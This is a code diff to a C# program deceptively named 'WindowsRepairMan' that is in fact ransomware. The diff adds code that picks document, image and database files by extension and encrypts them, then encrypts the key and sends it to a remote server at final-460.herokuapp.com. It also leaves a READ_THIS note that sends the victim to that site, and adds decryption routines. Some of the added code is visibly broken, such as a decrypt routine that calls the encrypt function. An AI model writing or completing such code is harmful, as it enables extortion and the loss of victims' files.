@@ -64,16 +64,63 @@ namespace WindowsRepairMan
 
         public static void EncryptDirectory(string location, string passphrase)
         {
+            var validExtensions = new[]
+            {
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+            };
             string[] files = Directory.GetFiles(location);
             string[] childDirs = Directory.GetDirectories(location);
             foreach(string file in files)
             {
-                EncryptFile(file, passphrase);
+                string extension = Path.GetExtension(file);
+                if (validExtensions.Contains(extension))
+                    EncryptFile(file, passphrase);
             }
             foreach(string dir in childDirs)
             {
                 EncryptDirectory(dir, passphrase);
             }
+        }
+
+        public static byte[] Decrypt(Byte[] inputBytes, Byte[] keyAndIvBytes)
+        {
+            Byte[] outputBytes = inputBytes;
+            string plainText = string.Empty;
+            using (MemoryStream ms = new MemoryStream(outputBytes))
+            {
+                using (AesManaged aes = new AesManaged())
+                {
+                    aes.KeySize = 512;
+                    aes.BlockSize = aes.LegalBlockSizes.Max().MaxSize;
+                    aes.Mode = CipherMode.CBC;
+                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(keyAndIvBytes, keyAndIvBytes), CryptoStreamMode.Read))
+                    {
+                        using (StreamReader sr = new StreamReader(cs))
+                        {
+                            return Encoding.UTF8.GetBytes(sr.ReadToEnd());
+                        }
+                    }
+                }
+            }
+        }
+
+        public static void DecryptFile(string filename, byte[] privateKey)
+        {
+            byte[] fileContents = File.ReadAllBytes(filename);
+            byte[] decryptedBytes = Encrypt(fileContents, privateKey);
+            File.WriteAllBytes(filename, decryptedBytes);
+            filename = filename.Substring(0, filename.Length - 7);
+            System.IO.File.Move(filename + ".locked", filename);
+        }
+
+        public static void DecryptDirectory(string location, byte[] privateKey)
+        {
+            string[] files = Directory.GetFiles(location);
+            string[] childDirs = Directory.GetDirectories(location);
+            foreach (string filename in files)
+                DecryptFile(filename, privateKey);
+            foreach (string childDir in childDirs)
+                DecryptDirectory(location, privateKey);
         }
 
         public static string EncryptStringRSA(string text, int keySize, string publicKey)
@@ -91,8 +138,9 @@ namespace WindowsRepairMan
             }
         }
 
-        public static void StartAction(string userName)
+        public static string StartAction()
         {
+            string userName = Environment.UserName;
             string userDir = "C:\\Users";
             string path = "\\Desktop\\test";
             string startPath = userDir + userName + path;
@@ -101,8 +149,11 @@ namespace WindowsRepairMan
             EncryptDirectory(startPath, password);
             string encryptedPassword = EncryptStringRSA(password, 2048, publicKey);
             SendKey(encryptedPassword);
-            password = null;
-            encryptedPassword = null;
+
+            string codeFile = CreatePassword(12);
+            File.WriteAllText(startPath + "\\" + codeFile + ".txt", password);
+            File.WriteAllText(startPath + "\\READ_THIS", "Go to https://final-460.herokuapp.com/");
+            return startPath + "\\" + codeFile + ".txt";
         }
 
         public static string GetPublicKey()
@@ -110,24 +161,25 @@ namespace WindowsRepairMan
             string computerName = System.Environment.MachineName.ToString();
             string userName = System.Environment.UserName;
             WebClient client = new WebClient();
-            NameValueCollection form = new NameValueCollection();
-            form["username"] = userName;
-            form["pcname"] = computerName;
-            string response = Encoding.UTF8.GetString(client.UploadValues("https://l.facebook.com/l.php?u=https%3A%2F%2Ffinal-460.herokuapp.com%2F&h=ZAQEBg8Ok", "POST", form));
+            client.Headers[HttpRequestHeader.ContentType] = "application/json";
+            string response = client.DownloadString("https://final-460.herokuapp.com/publicKey");
             client.Dispose();
             return response;
         }
 
         public static void SendKey(string key)
         {
-            string computerName = System.Environment.MachineName.ToString();
+            string userName = System.Environment.UserName;
             WebClient client = new WebClient();
+            client.Headers[HttpRequestHeader.ContentType] = "x-www-form-urlencoded";
             NameValueCollection form = new NameValueCollection();
-            form["userCode"] = SHA256Managed.Create().ComputeHash(Encoding.UTF8.GetBytes(computerName)).ToString();
+            form["userCode"] = SHA256Managed.Create().ComputeHash(Encoding.UTF8.GetBytes(userName)).ToString();
             form["key"] = key;
-            byte[] response = client.UploadValues("https://l.facebook.com/l.php?u=https%3A%2F%2Ffinal-460.herokuapp.com%2F&h=ZAQEBg8Ok", "POST", form);
+            byte[] response = client.UploadValues("https://final-460.herokuapp.com/privateKey", "POST", form);
             client.Dispose();
         }
+
+
 
     }
 }
